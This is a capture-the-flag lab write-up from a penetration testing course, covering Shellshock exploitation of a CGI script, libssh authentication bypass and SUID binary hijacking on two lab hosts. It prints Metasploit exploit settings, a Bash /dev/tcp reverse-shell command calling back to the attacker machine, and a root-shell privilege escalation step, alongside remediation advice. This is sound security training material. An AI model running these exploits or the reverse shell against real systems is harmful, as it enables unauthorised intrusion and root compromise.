# Host & Network Penetration Testing: System/Host-Based Attacks: Skill Check Lab 1
### Capture The Flag Lab Writeup

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment Overview](#2-lab-environment-overview)
3. [Reconnaissance: Target 1](#3-reconnaissance--target-1)
4. [Flag 1: Shellshock RCE via CGI Script (Target 1)](#4-flag-1--shellshock-rce-via-cgi-script-target-1)
5. [Flag 2: Hidden File Discovery in Web Root (Target 1)](#5-flag-2--hidden-file-discovery-in-web-root-target-1)
6. [Reconnaissance: Target 2](#6-reconnaissance--target-2)
7. [Flag 3: libssh Authentication Bypass (Target 2)](#7-flag-3--libssh-authentication-bypass-target-2)
8. [Flag 4: Privilege Escalation via SUID Binary Hijacking (Target 2)](#8-flag-4--privilege-escalation-via-suid-binary-hijacking-target-2)
9. [Summary of Findings](#9-summary-of-findings)
10. [Conclusions and Lessons Learned](#10-conclusions-and-lessons-learned)

---

## 1. Introduction

This report documents the methodology, tools, and findings from a **Skill Check Lab** exercise within the Host & Network Penetration Testing course module, focused on **System/Host-Based Attacks**. Unlike guided labs, Skill Check Labs provide no step-by-step solutions; the objective is to independently identify vulnerabilities, select appropriate exploitation techniques, and demonstrate practical competence against two live target machines.

Four flags were captured across two Linux targets, each requiring a distinct attack technique:

- **Target 1** was exploited via the **Shellshock** vulnerability (CVE-2014-6271) affecting a CGI script served by Apache, yielding remote code execution and a Meterpreter session.
- **Target 2** was compromised via the **libssh Authentication Bypass** vulnerability (CVE-2018-10933), followed by a **SUID binary hijacking** privilege escalation to achieve root-level access.

The techniques exercised in this lab include:

- **Service enumeration** using Nmap
- **CGI vulnerability scanning and exploitation** using the Metasploit Shellshock modules
- **Post-exploitation filesystem enumeration** via Meterpreter
- **SSH authentication bypass** using the Metasploit libssh scanner module
- **Remote command execution** over the authentication bypass channel
- **SUID binary analysis** and local privilege escalation via binary hijacking

All activities were performed within an isolated, authorised lab environment. No live or production systems were involved.

---

## 2. Lab Environment Overview

| Parameter          | Details                              |
|--------------------|--------------------------------------|
| Attacker Machine   | Kali Linux (GUI access provided)     |
| Target 1 Hostname  | `target1.ine.local`                  |
| Target 2 Hostname  | `target2.ine.local`                  |
| Attacker IP        | `192.82.195.2`                       |
| Target 1 IP        | `192.82.195.3`                       |
| Target 2 IP        | `192.82.195.4`                       |

### Tools Used

| Tool                   | Purpose                                                       |
|------------------------|---------------------------------------------------------------|
| `nmap`                 | Port scanning and service version detection                   |
| Metasploit Framework   | Shellshock scanning and exploitation; libssh bypass; handler |
| Meterpreter            | Post-exploitation shell and filesystem enumeration            |
| Bash / Shell           | Manual command execution on compromised targets               |

### Objectives

| Flag   | Target   | Hint                                                                                    |
|--------|----------|-----------------------------------------------------------------------------------------|
| Flag 1 | Target 1 | Check the root (`/`) directory for a file that might hold the key to the first flag.   |
| Flag 2 | Target 1 | Explore `/opt/apache/htdocs/` carefully, something may be hidden there.               |
| Flag 3 | Target 2 | Investigate the user's home directory using `libssh_auth_bypass`.                      |
| Flag 4 | Target 2 | Look into the `/root` directory to find the hidden flag.                               |

---

## 3. Reconnaissance: Target 1

A full TCP port scan with service version detection was performed against Target 1.

### Command Used

```bash
nmap -sV -p- target1.ine.local
```

### Results

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
```

### Analysis

Target 1 exposed a single service: an Apache 2.4.6 web server. Navigating to `http://target1.ine.local` redirected to `http://target1.ine.local/browser.cgi`, presenting the message:

```
Your browser, that is, Firefox, is supported!
```

The `.cgi` extension is significant. CGI (Common Gateway Interface) scripts are server-side executables invoked by the web server to generate dynamic responses. On systems where CGI scripts are executed by Bash, the **Shellshock** vulnerability (CVE-2014-6271, disclosed September 2014) allows an attacker to inject arbitrary commands into specially crafted HTTP headers. Apache 2.4.6 was released in July 2013, prior to the public disclosure of Shellshock, and the presence of a CGI endpoint made this the primary hypothesis for exploitation.

---

## 4. Flag 1: Shellshock RCE via CGI Script (Target 1)

### Hint

> *"Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local."*

### Methodology

Shellshock exploits a flaw in how older versions of Bash parse environment variables. When Bash processes a specially crafted environment variable containing a function definition followed by arbitrary commands, it executes those commands during initialisation. Because CGI scripts executed under Apache inherit HTTP request headers as environment variables, an attacker can embed a malicious payload within headers such as `User-Agent` or `Referer`, causing the server to execute arbitrary commands under the web server's process identity.

### Step 1: Confirm Shellshock Vulnerability

A Metasploit workspace was created for Target 1 and global host variables were set to avoid repeating options across modules.

```
msf6 > workspace -a target1
msf6 > setg RHOSTS target1.ine.local
msf6 > setg RHOST target1.ine.local
```

The Metasploit Shellshock scanner module was used to confirm whether the CGI endpoint was exploitable:

```
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /browser.cgi
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run
```

**Output:**

```
[+] uid=1(daemon) gid=1(daemon) groups=1(daemon)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The scanner successfully injected and executed the `/usr/bin/id` command, confirming the target was vulnerable to Shellshock. The server was running CGI scripts under the `daemon` user identity.

### Step 2: Exploit Shellshock for a Meterpreter Session

The exploitation module was loaded and configured with the CGI path and the attacker's IP address (bound to the `eth1` interface):

```
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /browser.cgi
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST eth1
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
```

**Output:**

```
[*] Started reverse TCP handler on 192.82.195.2:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.82.195.3
[*] Meterpreter session 1 opened (192.82.195.2:4444 -> 192.82.195.3:53534)
```

A Meterpreter session was successfully established. System information was retrieved to characterise the compromised host:

```
meterpreter > sysinfo
Computer     : target1.ine.local
OS           : Ubuntu 14.04 (Linux 6.8.0-57-generic)
Architecture : x64
Meterpreter  : x86/linux

meterpreter > getuid
Server username: daemon
```

### Step 3: Enumerate the Filesystem Root and Retrieve Flag 1

A shell was spawned from the Meterpreter session to enumerate the filesystem root:

```bash
ls /
```

**Output (relevant entries):**

```
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt
opt  proc  root  run  sbin  srv  start-apache2.sh  startup.sh
sys  tmp  usr  var
```

The `flag.txt` file was present directly in the filesystem root. Its contents were retrieved:

```bash
cat /flag.txt
```

```
FLAG1_{######################################}
```

### Analysis

The Shellshock vulnerability (CVE-2014-6271) is over a decade old but remains present in unpatched or legacy systems. In this case, Apache 2.4.6 on Ubuntu 14.04 itself end-of-life since April 2019 provided the execution environment. The attack required no credentials and produced a fully interactive reverse shell with minimal configuration. The flag stored at the filesystem root was immediately accessible to the `daemon` service account, indicating an absence of file permission controls on sensitive data.

### Flag Captured

```
FLAG1_{######################################}
```

---

## 5. Flag 2: Hidden File Discovery in Web Root (Target 1)

### Hint

> *"In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local."*

### Methodology

With an active Meterpreter session and shell access to Target 1, enumerating the web root directory specified in the hint was straightforward. The key was the word "hidden" in the hint on Linux systems, files prefixed with a dot (`.`) are hidden from standard `ls` output and require the `-a` flag to be revealed.

### Step 1: Initial Directory Listing

```bash
ls /opt/apache/htdocs/
```

**Output:**

```
browser.cgi
index.html
static
```

The standard listing revealed only the expected web application files, no flag was immediately visible.

### Step 2: List Hidden Files

```bash
ls -a /opt/apache/htdocs/
```

**Output:**

```
.
..
.flag.txt
browser.cgi
index.html
static
```

A hidden file, `.flag.txt`, was present in the web root directory. Its leading dot caused it to be omitted from standard directory listings.

### Step 3: Retrieve Flag 2

```bash
cat /opt/apache/htdocs/.flag.txt
```

```
FLAG2_{######################################}
```

### Analysis

Linux dot-files are a common technique for concealing files from casual inspection, but they provide no security benefit against an attacker with shell access who knows to use `ls -a`. Storing a flag (or in a real-world context, any sensitive file) within the web server's document root, even as a hidden file, is a significant risk: had directory listing been enabled on the Apache instance, the file would have been directly downloadable by any web visitor. Post-exploitation enumeration should always include hidden file inspection across all directories of interest.

### Flag Captured

```
FLAG2_{######################################}
```

---

## 6. Reconnaissance: Target 2

A full TCP port scan with service version detection was performed against Target 2.

### Command Used

```bash
nmap -sV -p- target2.ine.local
```

### Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
```

### Analysis

Target 2 exposed a single service: SSH running on libssh version 0.8.3. This version is directly affected by **CVE-2018-10933**, a critical authentication bypass vulnerability disclosed in October 2018. The flaw allows an unauthenticated client to send an `SSH2_MSG_USERAUTH_SUCCESS` message to the server, a message that is normally only sent *by* the server to indicate successful authentication, tricking the server into granting an authenticated session without any valid credentials being supplied. The hint explicitly referenced `libssh_auth_bypass`, confirming this as the intended attack vector.

A new workspace was created for Target 2:

```
msf6 > workspace -a target2
msf6 > setg RHOSTS target2.ine.local
msf6 > setg RHOST target2.ine.local
```

---

## 7. Flag 3: libssh Authentication Bypass (Target 2)

### Hint

> *"Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local."*

### Methodology

The Metasploit `auxiliary/scanner/ssh/libssh_auth_bypass` module implements the CVE-2018-10933 exploit. The module supports two actions: `Shell` (spawn an interactive shell session) and `Execute` (run a single command and return its output). An initial attempt to spawn an interactive shell session was unsuccessful, so the `Execute` action was used instead to run individual commands against the target.

### Step 1: Attempt Shell Spawn (Failed)

```
msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run
```

**Output:**

```
[-] Command shell session 2 is not valid and will be closed
[*] 192.82.195.4 - Command shell session 2 closed.
```

The shell action did not produce a usable session, likely due to TTY allocation constraints on the target.

### Step 2: Switch to Execute Action and Verify Access

The action was changed to `Execute` with a `whoami` command to confirm remote code execution:

```
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set ACTION Execute
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set CMD whoami
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run
```

**Output:**

```
[*] 192.82.195.4:22 - Executed: whoami
user
```

Command execution was confirmed under the `user` account identity.

### Step 3: Enumerate the User's Home Directory

```
set CMD 'ls -a /home/user'
run
```

**Output:**

```
.
..
.bash_logout
.bash_profile
.bashrc
.ssh
flag.txt
greetings
welcome
```

The home directory contained `flag.txt`, as well as two binary files: `greetings` and `welcome`, that would become relevant for Flag 4.

### Step 4: Retrieve Flag 3

```
set CMD 'cat /home/user/flag.txt'
run
```

**Output:**

```
[*] 192.82.195.4:22 - Executed: cat /home/user/flag.txt
FLAG3_{######################################}
```

### Analysis

CVE-2018-10933 is a protocol-level authentication bypass, the attacker does not need to know any valid username or password. Any service running libssh 0.8.3 (or earlier affected versions) is vulnerable, regardless of its authentication configuration. This is a critical severity vulnerability that was patched in libssh 0.7.6 and 0.8.4. Its presence on a network-exposed SSH service constitutes a complete failure of authentication as a security control, granting any unauthenticated attacker command execution in the context of the service account.

### Flag Captured

```
FLAG3_{######################################}
```

---

## 8. Flag 4: Privilege Escalation via SUID Binary Hijacking (Target 2)

### Hint

> *"The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local."*

### Methodology

Flag 4 was located in `/root`, a directory readable only by the root user. Accessing it required elevating privileges from the `user` account obtained via the libssh bypass. The two binaries discovered in `/home/user` during Flag 3 enumeration: `greetings` and `welcome` provided the escalation path.

### Step 1: Establish an Interactive Shell

To work more efficiently than issuing individual commands through the `Execute` action, a reverse shell was established using a Bash TCP redirect, connecting back to a `netcat` listener on the attacker machine:

```bash
# On the attacker machine:
nc -lvnp 4444

# Via libssh Execute action:
set CMD 'sh -i >& /dev/tcp/192.82.195.2/4444 0>&1'
run
```

This provided an interactive shell session, upgraded to a full Bash shell for improved usability.

### Step 2: Analyse the SUID Binaries

The two binaries in the home directory were examined for their permissions and behaviour:

```bash
ls -la /home/user/
```

**Output:**

```
-rwx------ 1 root root 8296 Jun 11 2024 greetings
-rwsr-xr-x 1 root root 8344 Jun 11 2024 welcome
```

Key observations:

- **`welcome`** has the **SUID bit set** (`rws` in the owner permissions field). When a binary has the SUID bit set and is owned by `root`, it executes with root privileges regardless of who runs it. It is also world-executable (`r-x` for group and others).
- **`greetings`** is owned by root and executable only by root (`rwx------`), making it inaccessible to the `user` account directly.

The `strings` utility was used to inspect the `welcome` binary for readable text content:

```bash
strings welcome
```

The output revealed that `welcome` calls `greetings` without using an absolute path, meaning it relies on the `PATH` environment variable to locate the executable. This is the critical detail: because `welcome` runs as root via SUID, and it executes `greetings` from the current working directory (or `PATH`), replacing `greetings` with a custom executable will cause `welcome` to execute that replacement with root privileges.

### Step 3: Remove the Original greetings Binary

```bash
rm /home/user/greetings
```

### Step 4: Create a Malicious greetings Replacement

A new `greetings` file was created in the same directory, containing a shell spawn command:

```bash
echo '/bin/bash -p' > /home/user/greetings
chmod +x /home/user/greetings
```

The `-p` flag to `/bin/bash` instructs Bash to preserve the effective user ID (root, inherited from the SUID `welcome` binary) rather than resetting it to the real user ID.

### Step 5: Execute the SUID Binary to Obtain a Root Shell

```bash
./welcome
```

**Result:** A root shell was obtained:

```
[root@target2 ~]#
```

### Step 6: Retrieve Flag 4

```bash
ls /root
flag.txt

cat /root/flag.txt
FLAG4_{######################################}
```

### Analysis

This privilege escalation is a textbook example of a **SUID binary hijacking** attack. The vulnerability arises from two compounding weaknesses: the `welcome` binary was granted the SUID bit (causing it to execute as root), and it called a dependent executable (`greetings`) without specifying its absolute path. When the dependent binary is writable or replaceable by a lower-privileged user, as was the case here, since both files resided in a directory owned by `user` an attacker can substitute their own executable and inherit the SUID binary's elevated privileges upon execution.

In a production environment, SUID binaries should be audited regularly using `find / -perm -4000 -type f 2>/dev/null`. Any SUID binary that calls external executables must do so using absolute paths, and the directories containing SUID binaries must not be writable by unprivileged users.

### Flag Captured

```
FLAG4_{######################################}
```

---

## 9. Summary of Findings

| Flag   | Target   | Service      | Port | Vulnerability                          | CVE              | Privilege Level  | Risk     |
|--------|----------|--------------|------|----------------------------------------|------------------|------------------|----------|
| Flag 1 | Target 1 | HTTP / CGI   | 80   | Shellshock: Bash env variable injection | CVE-2014-6271  | daemon (service) | Critical |
| Flag 2 | Target 1 | Filesystem   | —    | Hidden file in web root (dot-file)     | —                | daemon (service) | Medium   |
| Flag 3 | Target 2 | SSH (libssh) | 22   | libssh authentication bypass          | CVE-2018-10933   | user             | Critical |
| Flag 4 | Target 2 | Local        | —    | SUID binary hijacking (path injection) | —                | root             | Critical |

### Vulnerability Summary

1. **Shellshock (CVE-2014-6271) on Target 1**: Apache 2.4.6 serving a Bash-backed CGI script on an Ubuntu 14.04 system. The vulnerability allowed unauthenticated remote code execution via a malformed `User-Agent` HTTP header, yielding a reverse Meterpreter shell as the `daemon` service account.

2. **Sensitive File in Web Root (Target 1)**: A flag file prefixed with a dot was stored within the Apache document root. While hidden from standard directory listings, the file was immediately accessible to any process with filesystem access to the web root, including the compromised `daemon` account.

3. **libssh Authentication Bypass (CVE-2018-10933) on Target 2**: The SSH service was running libssh 0.8.3, a version vulnerable to a protocol-level authentication bypass. An unauthenticated attacker could gain remote command execution as the `user` account without supplying any credentials.

4. **SUID Binary Hijacking on Target 2**: The `welcome` binary was SUID-root and called a dependent executable (`greetings`) without an absolute path. Because both files resided in a user-writable directory, the `greetings` binary could be replaced with a malicious script, which was then executed with root privileges when `welcome` was invoked, yielding a root shell.

---

## 10. Conclusions and Lessons Learned

This Skill Check Lab required independently identifying two separate vulnerability classes across two distinct targets and chaining findings, particularly on Target 2, where the libssh bypass provided initial access and the SUID binary misconfiguration provided the escalation path to root. Neither target required guessing credentials; both were fully compromised through known, documented vulnerabilities affecting outdated or misconfigured software.

### Attack Chain Summary

```
Target 1
────────
Nmap → Apache 2.4.6 + CGI endpoint (/browser.cgi) identified
    └─► Shellshock Scanner → CGI endpoint confirmed vulnerable (CVE-2014-6271)
            └─► Shellshock Exploit → Meterpreter session (daemon)
                    └─► cat /flag.txt → FLAG 1
                    └─► ls -a /opt/apache/htdocs/ → .flag.txt discovered
                            └─► cat .flag.txt → FLAG 2

Target 2
────────
Nmap → libssh 0.8.3 on port 22 identified
    └─► libssh_auth_bypass (CVE-2018-10933) → RCE as user (Execute action)
            └─► ls -a /home/user → flag.txt + welcome + greetings
                    └─► cat /home/user/flag.txt → FLAG 3
            └─► Reverse shell → ls -la → welcome (SUID root) calls greetings
                    └─► rm greetings → echo '/bin/bash -p' > greetings → chmod +x
                            └─► ./welcome → root shell
                                    └─► cat /root/flag.txt → FLAG 4
```

### Key Takeaways

- **Patch legacy systems without exception.** Both CVE-2014-6271 (Shellshock) and CVE-2018-10933 (libssh bypass) are well over five years old at the time of this lab. Ubuntu 14.04 and Apache 2.4.6 are end-of-life systems that should not be exposed on any network. Unpatched legacy software is consistently the most reliable attack vector in penetration tests.

- **CGI scripts executed by Bash are a permanent Shellshock risk on unpatched systems.** The safest mitigations are to upgrade Bash to a patched version, disable CGI execution where it is not required, or migrate to a modern application framework that does not rely on shell-executed CGI scripts.

- **Authentication bypass vulnerabilities are among the most severe possible findings.** CVE-2018-10933 requires zero credentials and zero exploitation complexity. The only remediation is to upgrade to libssh 0.7.6 or 0.8.4 or later. Version pinning and dependency monitoring are essential practices for any service exposed to the network.

- **SUID binaries must use absolute paths for all called executables.** Any SUID binary that resolves dependent executables via `PATH` or relative paths is a privilege escalation risk. Developers should always use absolute paths in SUID binaries, and system administrators should audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`.

- **Directories containing SUID binaries must not be user-writable.** Even if a SUID binary uses absolute paths internally, if the binary itself resides in a user-writable directory, it can be replaced entirely. File and directory ownership must be reviewed as part of any hardening process.

- **Hidden dot-files provide no security protection.** The `-a` flag to `ls` reveals all dot-prefixed files immediately. Sensitive files must be protected through proper file permissions and placement outside web-accessible directories not through filename conventions.

---

*Report completed: June 25, 2026*
*Lab: Host & Network Penetration Testing: System/Host-Based Attacks: Skill Check Lab 1*
*Platform: INE Security / eLearnSecurity*
